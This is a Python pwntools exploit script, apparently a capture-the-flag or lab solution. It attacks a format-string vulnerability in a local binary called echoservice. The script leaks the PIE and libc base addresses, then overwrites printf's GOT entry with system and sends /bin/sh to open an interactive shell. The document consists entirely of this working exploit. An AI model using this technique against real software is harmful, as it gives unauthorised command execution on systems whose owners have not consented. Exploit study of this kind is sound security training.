#!#!/usr/bin/env python3
from pwn import *

# Read binaries
elf = context.binary = ELF("/usr/bin/echoservice")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# For GDB debugging
gs = '''
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()

# Calculate offset from 21th value in stack to pie base without aslr
offset = 0x555555555275 - 0x555555554000

payload = b"%27$p"
p.sendline(payload)
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - offset

log.success(f"PIE base: {hex(elf.address)}")

# Get value of printf in got
printf_got = elf.got['printf']

payload = b"%7$s|END"
payload += p64(printf_got)

p.sendline(payload)
PRINTF = unpack(p.recvuntil(b"|END", drop=True), 'all')

log.success(f"PRINTF: {hex(PRINTF)}")

# Get libc base
libc.address = PRINTF - libc.sym['printf']

log.success(f"LIBC base: {hex(libc.address)}")

writes = { printf_got: libc.sym['system'] }

payload = fmtstr_payload(6, writes, write_size='short')

p.sendline(payload)
p.clean()
p.sendline(b"/bin/sh")

p.interactive()
